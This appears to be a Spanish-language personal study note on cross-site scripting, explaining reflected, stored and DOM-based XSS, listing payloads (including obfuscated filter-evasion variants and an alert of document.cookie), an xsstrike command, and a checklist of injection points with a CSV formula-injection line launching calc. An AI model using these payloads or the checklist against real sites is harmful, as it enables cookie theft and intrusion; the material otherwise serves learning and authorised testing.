#Inyeccion
# Que es XSS?
_XSS_ es un tipo de vulnerabilidad que permite al atacante insertar codigo malicioso (pueder ser JavaScript, PHP u otros)

Existen varios tipos de _xss_:

---
### Reflected/Non Persistent
Este tipo de xss se produce cuando los datos, o en este caso, el codigo malicioso proporcionado por el atacante _se muestra es la respuesta HTTP_ sin ser verificado correctamente. Este tipo de xss **no persiste** en el servidor, el impacto 
* _Impacto_: Phishing o robo de token/cookie.

Estos son algunos _payloads_ de xss reflected:
``"><script>alert('XSS')</script>` 
`"><img src=x onerror=alert('XSS')>` 
### Stored o Almacenado
Este tipo de xss se produce cuando el payload _se guarda_ en la base de datos. Dicho codigo se ejecuta cada vez que se refresca la pagina 

### DOM-Based 
Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

---
### Estos son algunos payloads XSS

```
`"><script>alert('XSS')</script>` 
"><img src=x onerror=alert('XSS')>

';k='e'%0Atop['al'+k+'rt'](1)// 

';window/aabb/['al'%2b'ert'](document./aabb/location);// 

">>>>>><marquee>RXSS</marquee></head><abc><​/script><​script>alert(document.cookie)<​/script><​meta

ا='',ب=!ا+ا,ت=!ب+ا,ث=ا+{},ج=ب[ا++],ح=ب[خ=ا], ‎د=++خ+ا,ذ=ث[خ+د],ب[ذ+=ث[ا]+(ب.ت+ث)[ا]+ت[د]+ج+ح+ب[خ]+ذ+ج+ث[ا]+ح][ذ](ت[ا]+ت[خ]+ب[د]+ح+ج+"(1)")() 

='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а], з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")() 

𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+'(alert(document.domain))')() 

𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()

```

Podes buscar asi:

```bash
xsstriker -u https://idk.com/hola?asdl=
```

y va a devolver una serie de payloads para probar

---
### Donde buscar?

#### 1. Formularios internos de administración
Notas, comentarios, mensajes internos.
#### 2. Campos ocultos (hidden inputs)
Muchos se reflejan sin sanitizar.
#### 3. Parámetros en JSON (POST / PUT)
Especialmente `displayName`, `title`, `description`.
#### 4. Valores guardados que reaparecen en otra vista (second-order)
Inyectás en A → explota en B.
#### 5. Logs visibles desde el panel
Cualquier cosa que aparezca en:
- error logs
- activity logs 
- audit logs
#### 6. PDF generados por el servidor
Muchos motores PDF renderizan HTML.
#### 7. Exportaciones CSV / Excel
`=cmd|' /C calc'!A0` → XSS/Command en Excel (muy ignorado).
#### 8. Previsualizadores de imágenes
Metadatos EXIF con payload como autor o descripción.
#### 9. Nombres de archivos
`"><img src=x onerror=alert(1)>.jpg`
#### 10. Parámetros usados en redirect o navegación
`?next=`  
`?url=`  
`?redirectTo=`
#### 11. XSS en DOM (sin intervención del servidor)
Buscá JS que use:
- `innerHTML`
- `document.write`
- `location.hash`
- `location.search`
- `insertAdjacentHTML`    
#### 12. Widgets de terceros
Chats, iframes, integraciones, plugins.
#### 13. Campos de búsqueda internos en paneles
No los mismos que usan los clientes.
#### 14. WYSIWYG editors (CKEditor, TinyMCE, Quill)
Versiones viejas = XSS seguro.
#### 15. Markdown mal sanitizado
`<img src=x onerror=alert(1)>` pasa en muchos.
#### 16. Campos de soporte/tickets
Mensajes + adjuntos + títulos.
#### 17. XSS en emails HTML
Un valor tuyo aparece en el email que recibe otro usuario.
#### 18. Subdominios viejos/olvidados
Suelen tener filtrado cero.
#### 19. Parámetros en iframes o embeds
Muchos permiten inyectar `srcdoc`.
#### 20. Campos que se concatenan para crear HTML
Ejemplo: panel que arma notificaciones tipo:
`<div>Hola, {username}</div>`
Si no escapan, XSS seguro.








